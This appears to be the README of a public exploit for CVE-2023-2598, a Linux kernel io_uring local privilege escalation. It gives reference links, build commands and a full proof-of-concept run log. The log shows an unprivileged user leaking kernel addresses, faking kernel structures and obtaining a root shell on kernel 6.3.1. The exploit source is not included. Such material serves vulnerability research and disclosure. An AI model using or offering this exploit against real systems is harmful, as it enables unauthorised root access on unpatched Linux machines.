
# CVE-2023-2598

Refer:
- https://anatomic.rip/cve-2023-2598/
- https://github.com/ysanatomic/io_uring_LPE-CVE-2023-2598
- https://bsauce.github.io/2024/07/30/CVE-2023-2598/

Build:
```shell
apt install -y liburing-dev
gcc CVE-2023-2598.c -o CVE-2023-2598 -luring
```

PoC:
```
user1@syzkaller:~$ uname -a
Linux syzkaller 6.3.1 #6 SMP PREEMPT_DYNAMIC Wed Nov  6 16:50:02 CST 2024 x86_64 GNU/Linux
user1@syzkaller:~$ id
uid=1000(user1) gid=1000(eop-test) groups=1000(eop-test) context=system_u:system_r:kernel_t:s0
user1@syzkaller:~$ ./CVE-2023-2598
[+] CVE-2023-2598 Exploit by LL
[+] Old rlimit_cur = 1024
[+] New rlimit_cur = 1048576
[+] limit: 349518, nr_sockets: 174759, nr_memfds: 174759
[+] memfd: 0, page: 0 at virt_addr: 0x4247000000, reading 2048000 bytes
[+] Found egg 0xdeadbeefdeadbeef at receiver_buffer+0x1491c8
[+] Found sock at receiver_buffer+0x149000
[+] Found kaslr_leak: 0xffffffff81add890
[+] Found kaslr_base: 0xffffffff81000000
[+] Found socket fd: 1936
[+] Found sock kernel addr: 0xffff88813b000000
[+] Fake proto kernel addr: 0xffff88813b000578
[+] Set args kernel addr: 0xffff88813b000730
[+] Set argv kernel addr: 0xffff88813b000760
[+] Set subprocess_info to sock+0 at 0xffff88813b000000
[+] Calling ioctl()...
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:kernel_t:s0
# whoami
root
# exit
[+] Resotre back the tcp_sock
[+] Done
```
